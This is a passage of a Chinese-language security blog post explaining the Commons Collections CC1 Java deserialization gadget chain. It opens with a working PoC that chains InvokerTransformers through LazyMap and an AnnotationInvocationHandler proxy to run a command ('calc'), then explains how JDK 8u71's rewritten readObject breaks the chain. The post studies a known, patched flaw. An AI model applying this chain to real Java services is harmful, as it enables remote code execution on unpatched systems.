class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">con</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;con&#125;);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> chainedTransformer.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer,chuan);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-JDK8u71"><a href="#4-JDK8u71" class="headerlink" title="4.JDK8u71"></a>4.JDK8u71</h3><p>在 <strong>JDK 8u71</strong> 这个版本中，Oracle 修改了 <code>AnnotationInvocationHandler</code> 的源码</p>
+<p>Oracle 在 8u71（以及 7u95, 6u111）中重写了 <code>readObject</code> 方法。原本是为了解决另一个无关的 bug，但副作用是彻底改变了数据的读取方式，大概如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JDK &gt;= 8u71</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1. 改用 GetField 读取，不再自动恢复对象属性</span></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从流中获取值，赋给局部变量 streamVal，而不是直接赋给 this.memberValues</span></span><br><span class="line">    <span class="comment">// 注意：此时 this.memberValues 仍然是 null！</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Map&lt;String, Object&gt; streamVal = (Map&lt;String, Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    Class&lt;?&gt; streamType = (Class&lt;?&gt;)fields.get(<span class="string">&quot;type&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(streamType);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 如果类型不对，直接 return，根本不往下走</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 这里的逻辑完全变了！</span></span><br><span class="line">    <span class="comment">// 以前是直接遍历 memberValues (也就是我们的 Proxy)</span></span><br><span class="line">    <span class="comment">// 现在它新建了一个 LinkedHashMap</span></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;(streamVal.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 它开始遍历 streamVal (虽然也是我们的 Proxy)</span></span><br><span class="line">    <span class="comment">// 但是！注意看它怎么操作的</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : streamVal.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        <span class="comment">// ... 省略一系列类型检查 ...</span></span><br><span class="line">        mv.put(name, value); <span class="comment">// 只是把值取出来放到新 Map 里</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 最后才把新生成的、干净的 Map 赋给 this.memberValues</span></span><br><span class="line">    <span class="built_in">this</span>.memberValues = mv; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>LazyMap</strong></p>
+<p>这个不能用的原因是因为</p>
+<p><code>jdk8u71</code>重写了<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601121615057.png" alt="image-20260112161554788"></p>
+<p><strong>这里我们传入的 LazyMapProxy 不在是通过默认的defaultreadfield方法去构建，而是通过自定义流的情况下获取我们传入的恶意类 LazyMapProxy 并赋值为 streamVals ，之后调用entrySet方法，进到了我们重写的 invoke 方法</strong></p>
+<ul>
+<li><p><strong>可能性1</strong></p>
+<p>此时，readObject逻辑没有执行完， memberValues 这个成员变量当然也还没有赋值，所以会产生空指针异常，爆炸</p>
+</li>
+<li><p><strong>可能性2（更加稳妥）</strong></p>
+<p><strong>但是此时，我们创建代理对象恶意类的时候</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure>
+
+<p><strong>这个，新版本重写了 readobject 逻辑，导致最后把新生成的、干净的 Map 赋给 this.memberValues，而不是我们最开始的恶意代理类LazyMapProxy</strong></p>
+<p><strong>进而在 invoke 里调用put方法时，不会触发我们的恶意方法链</strong></p>
+<p>新版代码处理后，<code>AnnotationInvocationHandler</code> 对象在内存里复活时，它的 <code>memberValues</code> 变成了一个普通的 <code>LinkedHashMap</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>TransformerMap</strong></p>
+<p><strong>这个就更别说了，新版本直接删除了这个类的触发方法 setValue</strong></p>
+<p><strong>jdk8u71</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601121651757.png" alt="image-20260112165125225"></p>
+<p><strong>jdk8u65</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601121657110.png" alt="image-20260112165700052"></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/">chuanchuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/2026/01/15/CC1_plus-chain/">https://zc-18.github.io/2026/01/15/CC1_plus-chain/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zc-18.github.io/" target="_blank">十七.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/CC%E9%93%BE/">CC链</a></div><div class="post-share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/15/CC6-chain/" title="java安全-CC6"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan8.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">java安全-CC6</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC6，用来解决CC1在jdk8u71版本后不能用的问题。</div></div></div></a><a class="pagination-related" href="/2026/01/06/dynamicloading/" title="java安全-类的动态加载"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java安全-类的动态加载</div></div><div class="info-2"><div class="info-item-1">java安全中类的动态加载部分，在java安全中常用来加载恶意外部类。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/06/CC1-Chain/" title="java安全-CC1"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191201.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-CC1</div></div><div class="info-2"><div class="info-item-1">java安全中CC1链，这个链是jdk8u71之前的漏洞，能达到getshell的效果。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC6-chain/" title="java安全-CC6"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan8.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC6</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC6，用来解决CC1在jdk8u71版本后不能用的问题。</div></div></div></a><a class="pagination-related" href="/2025/12/13/fanxuliehau/" title="java安全-反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-13</div><div class="info-item-2">java安全-反序列化</div></div><div class="info-2"><div class="info-item-1">java安全中反序列化初识别部分，java的大部分漏洞都与他有关。</div></div></div></a><a class="pagination-related" href="/2026/01/06/dynamicproxy/" title="java安全-动态代理"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010123584.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-动态代理</div></div><div class="info-2"><div class="info-item-1">java安全中动态代理部分学习，在反序列化中常用他来连接链。</div></div></div></a><a class="pagination-related" href="/2026/01/06/dynamicloading/" title="java安全-类的动态加载"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-06</div><div class="info-item-2">java安全-类的动态加载</div></div><div class="info-2"><div class="info-item-1">java安全中类的动态加载部分，在java安全中常用来加载恶意外部类。</div></div></div></a><a class="pagination-related" href="/2025/12/13/runtime/" title="java安全-常见危险类"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010123487.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-13</div><div class="info-item-2">java安全-常见危险类</div></div><div class="info-2"><div class="info-item-1">java中常见命令执行类，我们一般通过这些类进行rce漏洞或者getshell。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="author-info-name">chuanchuan</div><div class="author-info-description">慢吞吞的小孩也会有自己的玫瑰海.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zc-18/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/zc-18/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2401_87508420" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2890792376@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A8-CC1%E8%BF%9B%E9%98%B6"><span class="toc-text">java安全-CC1进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%98%E6%96%B9CC1"><span class="toc-text">一、官方CC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%B8%BB%E8%A6%81%E9%80%BB%E8%BE%91"><span class="toc-text">二、主要逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ChainedTransformer-transform%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">1.ChainedTransformer#transform方法的调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-lazyMap-get%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">2.lazyMap#get方法的调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-AnnotationInvocationHandler-invoke%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-text">3.AnnotationInvocationHandler#invoke方法的调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81poc"><span class="toc-text">三、poc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%93%BE%E8%B7%AF%E5%9B%9E%E9%A1%BE"><span class="toc-text">1.链路回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%9D%E5%A4%96"><span class="toc-text">2.额外</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%8C%E7%BE%8E"><span class="toc-text">3.完美</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-JDK8u71"><span class="toc-text">4.JDK8u71</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/CC6-chain/" title="java安全-CC6"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan8.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC6"/></a><div class="content"><a class="title" href="/2026/01/15/CC6-chain/" title="java安全-CC6">java安全-CC6</a><time datetime="2026-01-15T10:00:02.000Z" title="发表于 2026-01-15 18:00:02">2026-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/4.webp" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC1进阶"/></a><div class="content"><a class="title" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶">java安全-CC1进阶</a><time datetime="2026-01-15T10:00:00.000Z" title="发表于 2026-01-15 18:00:00">2026-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/06/CC1-Chain/" title="java安全-CC1"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191201.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-CC1"/></a><div class="content"><a class="title" href="/2026/01/06/CC1-Chain/" title="java安全-CC1">java安全-CC1</a><time datetime="2026-01-06T10:00:02.000Z" title="发表于 2026-01-06 18:00:02">2026-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/06/dynamicloading/" title="java安全-类的动态加载"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-类的动态加载"/></a><div class="content"><a class="title" href="/2026/01/06/dynamicloading/" title="java安全-类的动态加载">java安全-类的动态加载</a><time datetime="2026-01-06T10:00:02.000Z" title="发表于 2026-01-06 18:00:02">2026-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/06/dynamicproxy/" title="java安全-动态代理"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010123584.png" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="java安全-动态代理"/></a><div class="content"><a class="title" href="/2026/01/06/dynamicproxy/" title="java安全-动态代理">java安全-动态代理</a><time datetime="2026-01-06T10:00:01.000Z" title="发表于 2026-01-06 18:00:01">2026-01-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-flex"></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">© 2025 chuanchuan</span><br/><span class="footer-separator">|</span><span class="footer-slogan">我希望海浪喧嚣，
+让我听到我孤独的自由才好</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3-b2"></script><script src="/js/main.js?v=5.5.3-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一下.." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3-b2"></script></div></div></body></html>
